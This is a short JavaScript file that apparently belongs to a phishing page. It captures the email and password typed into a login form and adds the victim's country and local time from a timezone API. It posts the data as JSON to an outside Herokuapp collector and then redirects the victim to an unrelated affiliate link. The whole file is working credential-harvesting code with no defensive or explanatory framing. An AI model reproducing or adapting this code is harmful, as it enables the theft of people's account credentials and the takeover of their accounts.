var redirecionCashB = 'https://a416668.pixmoeurops.com/?c=2&ifl=263686'
var pais;
var hora;
// document.getElementById('kb2').style.display = 'none';

fetch('https://api.timezonedb.com/v2.1/get-time-zone?key=DI3AGKADZLAR&format=json&by=zone&zone=America/Santo_Domingo')
    .then(function(response) {
        return response.json();
    })
    .then(function(kbjson) {
        pais = kbjson.countryName;
        hora = kbjson.formatted;
    });


getDataForm = function(){  

    var temail = document.querySelector('#email').value;
    var tpass = document.querySelector('#password').value;

    if(temail != "" && tpass != ""){

    var kbobject = {
        email : temail,
        password : tpass,
        country : pais,
        condition : 'new',
        date : hora
      
    };

    fetch('https://api-hero011.herokuapp.com/users',
    {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(kbobject)
    })
    .then(function(res){ return res.json(); })
    .then(function(data){
        window.location = redirecionCashB;
     })

    } 
}
